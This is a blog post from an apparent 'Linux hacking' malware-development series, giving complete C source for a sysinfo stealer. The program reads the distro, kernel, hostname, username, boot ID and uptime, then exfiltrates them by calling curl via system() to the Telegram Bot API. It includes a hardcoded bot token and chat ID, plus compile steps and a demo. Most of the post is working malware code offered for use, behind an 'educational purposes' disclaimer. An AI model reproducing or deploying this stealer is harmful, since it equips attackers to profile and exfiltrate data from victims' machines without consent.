---
title:  "Linux hacking part 7: Linux sysinfo stealer: Telegram Bot API. Simple C example"
date:   2025-10-09 02:00:00 +0200
header:
  teaser: "/assets/images/179/2025-10-10_08-41.png"
categories:
  - linux
tags:
  - red team
  - linux
  - malware
  - apt
  - stealer
---

﷽

Hello, cybersecurity enthusiasts and white hackers!        

![malware](/assets/images/179/2025-10-10_08-41.png){:class="img-responsive"}    

In my macOS and Windows series I showed a tiny sysinfo stealer PoCs. Today we'll build the Linux twin: a small C PoC that reads system facts via libc and `/proc`, formats them nicely, and emits to stdout (optionally to a local file) and send via abusing Telegram Bot API. Along the way I'll show a common pitfall that bites many "send-to-API" snippets: shell quoting & URL encoding.   

### practical example

What we're building:    
- OS pretty name from /etc/os-release   
- Kernel/arch via `uname(2)`    
- Host/user via `gethostname()` and `getpwuid(geteuid())`    
- Boot ID from `/proc/sys/kernel/random/boot_id`    
- Human-readable uptime from /proc/uptime     

Finally: print to stdout; optionally append to a local file via `SYSINFO_OUT=/path/file.txt` and sending to API.    

The interesting part is robust data collection and formatting. If you later experiment with external endpoints inside a controlled lab, you already know you must handle URL encoding and avoid fragile shell interpolation.     

First of all we need minimal helpers. Reading a single line from a file and trimming trailing whitespace is 90% of this PoC:    

```cpp
static void rstrip(char *s) {
  if (!s) return;
  size_t n = strlen(s);
  while (n && (s[n-1]=='\n' || s[n-1]=='\r' || s[n-1]==' ' || s[n-1]=='\t')) {
    s[--n] = '\0';
  }
}

static int read_first_line(const char *path, char *out, size_t out_sz) {
  FILE *f = fopen(path, "r");
  if (!f) return -1;
  if (!fgets(out, (int)out_sz, f)) { fclose(f); return -1; }
  fclose(f);
  rstrip(out);
  return 0;
}
```

Then we need to parse distro name, uptime, boot ID:    

```cpp
static int read_os_pretty_name(char *out, size_t out_sz) {
  FILE *f = fopen("/etc/os-release", "r");
  if (!f) return -1;
  char line[BUF512];
  int ok = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
      char *p = strchr(line, '=');
      if (!p) break;
      p++; // after '='
      while (*p == ' ' || *p == '\t') p++;
      // strip quotes if present
      if (*p == '\"') {
        p++;
        char *q = strrchr(p, '\"');
        if (q) *q = '\0';
      } else {
        rstrip(p);
      }
      strncpy(out, p, out_sz - 1);
      out[out_sz - 1] = '\0';
      ok = 0;
      break;
    }
  }
  fclose(f);
  return ok;
}

static void format_uptime(char *out, size_t out_sz) {
  char buf[BUF256] = {0};
  if (read_first_line("/proc/uptime", buf, sizeof(buf)) == 0) {
    // format: "<seconds> <idle_seconds>"
    double up = 0.0;
    if (sscanf(buf, "%lf", &up) == 1) {
      long s = (long)up;
      long days = s / 86400; s %= 86400;
      long hrs = s / 3600;   s %= 3600;
      long min = s / 60;
      snprintf(out, out_sz, "%ldd %ldh %ldm", days, hrs, min);
      return;
    }
  }
  snprintf(out, out_sz, "N/A");
}
```

And we use the same function for sending all to Telegram Bot API. But, we have caveats. If you ever pipe a raw, multi-line string into a shell command like:   

```bash
curl ... -d text="...your message here..."
```

you'll eventually hit a crash when the message contains `"` or `\n`. The right answer is percent-encoding (URL encoding) before it leaves your process, and ideally avoiding the shell altogether (use `execve/execvp` or `libcurl`). In this post we use this helper for lab experiments:    

```cpp
// rfc 3986 ???
static int url_encode(const char *src, char *dst, size_t dstsz) {
  static const char hex[] = "0123456789ABCDEF";
  size_t j = 0;
  for (size_t i = 0; src[i] != '\0'; i++) {
    unsigned char c = (unsigned char)src[i];
    if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
      if (j + 1 >= dstsz) return -1;
      dst[j++] = (char)c;
    } else {
      if (j + 3 >= dstsz) return -1;
      dst[j++] = '%';
      dst[j++] = hex[(c >> 4) & 0xF];
      dst[j++] = hex[c & 0xF];
    }
  }
  if (j >= dstsz) return -1;
  dst[j] = '\0';
  return 0;
}
```

So, our `sendToTgBot` is looks like this:    

```cpp
// function to send message via Telegram Bot API
int sendToTgBot(const char* message, const char* botToken, const char* chatId) {
  // worst scenario: for earch byte %HH -> *3 + 1
  char enc[MSGSZ * 3 + 1];
  if (url_encode(message, enc, sizeof(enc)) != 0) {
    fprintf(stderr, "url_encode: output buffer too small\n");
    return 2;
  }

  char command[8192];
  // encoded (safe encoded?)
  int n = snprintf(command, sizeof(command),
    "curl -sS -X POST https://api.telegram.org/bot%s/sendMessage "
    "-d chat_id=%s -d text=%s",
    botToken, chatId, enc);
  if (n <= 0 || (size_t)n >= sizeof(command)) {
    fprintf(stderr, "snprintf: command truncated\n");
    return 2;
  }

  puts (message);
  int rc = system(command);
  // system returning status waitpid
  if (rc == -1) return 127;
  if (WIFEXITED(rc)) return WEXITSTATUS(rc);
  return 126;
}
```

Final full source code is looks like this `hack.c`:    

```cpp
/*
 * hack.c
 * simple linux sysinfo 
 * Telegram Bot API stealer (+stdout PoC)
 * author: @cocomelonc
 * https://cocomelonc.github.io/linux/2025/10/09/linux-hacking-7.html
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <errno.h>

#define BUF128 128
#define BUF256 256
#define BUF512 512
#define MSGSZ  2048

// rfc 3986 ???
static int url_encode(const char *src, char *dst, size_t dstsz) {
  static const char hex[] = "0123456789ABCDEF";
  size_t j = 0;
  for (size_t i = 0; src[i] != '\0'; i++) {
    unsigned char c = (unsigned char)src[i];
    if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
      if (j + 1 >= dstsz) return -1;
      dst[j++] = (char)c;
    } else {
      if (j + 3 >= dstsz) return -1;
      dst[j++] = '%';
      dst[j++] = hex[(c >> 4) & 0xF];
      dst[j++] = hex[c & 0xF];
    }
  }
  if (j >= dstsz) return -1;
  dst[j] = '\0';
  return 0;
}


// function to send message via Telegram Bot API
int sendToTgBot(const char* message, const char* botToken, const char* chatId) {
  // worst scenario: for earch byte %HH -> *3 + 1
  char enc[MSGSZ * 3 + 1];
  if (url_encode(message, enc, sizeof(enc)) != 0) {
    fprintf(stderr, "url_encode: output buffer too small\n");
    return 2;
  }

  char command[8192];
  // encoded (safe encoded?)
  int n = snprintf(command, sizeof(command),
    "curl -sS -X POST https://api.telegram.org/bot%s/sendMessage "
    "-d chat_id=%s -d text=%s",
    botToken, chatId, enc);
  if (n <= 0 || (size_t)n >= sizeof(command)) {
    fprintf(stderr, "snprintf: command truncated\n");
    return 2;
  }

  puts (message);
  int rc = system(command);
  // system returning status waitpid
  if (rc == -1) return 127;
  if (WIFEXITED(rc)) return WEXITSTATUS(rc);
  return 126;
//   puts (message);
//   return 0;
}

static void rstrip(char *s) {
  if (!s) return;
  size_t n = strlen(s);
  while (n && (s[n-1]=='\n' || s[n-1]=='\r' || s[n-1]==' ' || s[n-1]=='\t')) {
    s[--n] = '\0';
  }
}

static int read_first_line(const char *path, char *out, size_t out_sz) {
  FILE *f = fopen(path, "r");
  if (!f) return -1;
  if (!fgets(out, (int)out_sz, f)) { fclose(f); return -1; }
  fclose(f);
  rstrip(out);
  return 0;
}

static int read_os_pretty_name(char *out, size_t out_sz) {
  FILE *f = fopen("/etc/os-release", "r");
  if (!f) return -1;
  char line[BUF512];
  int ok = -1;
  while (fgets(line, sizeof(line), f)) {
    if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
      char *p = strchr(line, '=');
      if (!p) break;
      p++; // after '='
      while (*p == ' ' || *p == '\t') p++;
      // strip quotes if present
      if (*p == '\"') {
        p++;
        char *q = strrchr(p, '\"');
        if (q) *q = '\0';
      } else {
        rstrip(p);
      }
      strncpy(out, p, out_sz - 1);
      out[out_sz - 1] = '\0';
      ok = 0;
      break;
    }
  }
  fclose(f);
  return ok;
}

static void format_uptime(char *out, size_t out_sz) {
  char buf[BUF256] = {0};
  if (read_first_line("/proc/uptime", buf, sizeof(buf)) == 0) {
    // format: "<seconds> <idle_seconds>"
    double up = 0.0;
    if (sscanf(buf, "%lf", &up) == 1) {
      long s = (long)up;
      long days = s / 86400; s %= 86400;
      long hrs = s / 3600;   s %= 3600;
      long min = s / 60;
      snprintf(out, out_sz, "%ldd %ldh %ldm", days, hrs, min);
      return;
    }
  }
  snprintf(out, out_sz, "N/A");
}

int main(void) {
  struct utsname u;
  char hostname[BUF256] = {0};
  char username[BUF128] = {0};
  char distro[BUF256]   = {0};
  char boot_id[BUF256]  = {0};
  char uptime_h[BUF128] = {0};

  // uname: kernel + arch
  if (uname(&u) != 0) {
    perror("uname");
    return 1;
  }

  // hostname
  if (gethostname(hostname, sizeof(hostname)) != 0) {
    strncpy(hostname, "N/A", sizeof(hostname)-1);
  } else {
    hostname[sizeof(hostname)-1] = '\0';
  }

  // username (effective user)
  struct passwd *pw = getpwuid(geteuid());
  if (pw && pw->pw_name) {
    strncpy(username, pw->pw_name, sizeof(username)-1);
  } else {
    const char *envu = getenv("USER");
    strncpy(username, envu ? envu : "N/A", sizeof(username)-1);
  }

  // distro pretty name
  if (read_os_pretty_name(distro, sizeof(distro)) != 0) {
    // fallback to /etc/issue first line (optional)
    if (read_first_line("/etc/issue", distro, sizeof(distro)) != 0) {
      strncpy(distro, "Unknown (no /etc/os-release)", sizeof(distro)-1);
    }
  }

  // boot id (stable per boot on many distros)
  if (read_first_line("/proc/sys/kernel/random/boot_id", boot_id, sizeof(boot_id)) != 0) {
    strncpy(boot_id, "N/A", sizeof(boot_id)-1);
  }

  // uptime
  format_uptime(uptime_h, sizeof(uptime_h));

  // compose message
  char msg[MSGSZ];
  snprintf(msg, sizeof(msg),
           "distro: %s\n"
           "kernel: %s %s\n"
           "machine: %s\n"
           "hostname: %s\n"
           "username: %s\n"
           "boot ID: %s\n"
           "uptime: %s\n",
           distro,
           u.sysname, u.release,
           u.machine,
           hostname,
           username,
           boot_id,
           uptime_h);

  // Telegram Bot details 
  const char* botToken = "7725786727:AAEuylKfQgTg5RBMeXwyk9qKhcV5kULP_po"; // replace with your bot token 
  const char* chatId = "5547299598"; // replace with your chat ID
  int rc = sendToTgBot(msg, botToken, chatId);
  if (rc == 0) {
    fprintf(stderr, "sysinfo successfully collected =^..^=\n");
    return 0;
  } else {
    fprintf(stderr, "sysinfo stealing failed: %d :(\n", rc);
    return 2;
  }
}
```

### demo

Let's go to see everythin in action. Compile it:    

```bash
gcc -o hack hack.c
```

![malware](/assets/images/179/2025-10-10_08-40.png){:class="img-responsive"}    

![malware](/assets/images/179/2025-10-10_08-58.png){:class="img-responsive"}    

![malware](/assets/images/179/2025-10-10_08-59.png){:class="img-responsive"}    

As you can see, everything worked perfectly as expected! =^..^=    

Also perfectly worked with my kali linux distro:    

![malware](/assets/images/179/2025-10-09_18-39.png){:class="img-responsive"}    

![malware](/assets/images/179/2025-10-09_18-49.png){:class="img-responsive"}    

![malware](/assets/images/179/2025-10-09_18-50.png){:class="img-responsive"}    

![malware](/assets/images/179/2025-10-09_18-51.png){:class="img-responsive"}    

This is a compact, portable sysinfo collector for Linux. Of course, it's possible to make it more universal and add exception handling, but this is just a "dirty PoC".    

I hope this post with practical example is useful for malware researchers, linux programmers and everyone who interested on linux kernel programming techniques.    

[Linux malware development 1: intro to kernel hacking. Simple C example](/linux/2024/06/20/linux-kernel-hacking-1.html)      
[Linux malware development 2: find process ID by name. Simple C example](/linux/2024/09/16/linux-hacking-2.html)      
[Linux hacking part 5: building a Linux keylogger. Simple C example](/linux/2025/06/03/linux-hacking-5.html)      
[source code in github](https://github.com/cocomelonc/meow/tree/master/2025-10-09-linux-hacking-7)    

> This is a practical case for educational purposes only.

Thanks for your time happy hacking and good bye!         
*PS. All drawings and screenshots are mine*       
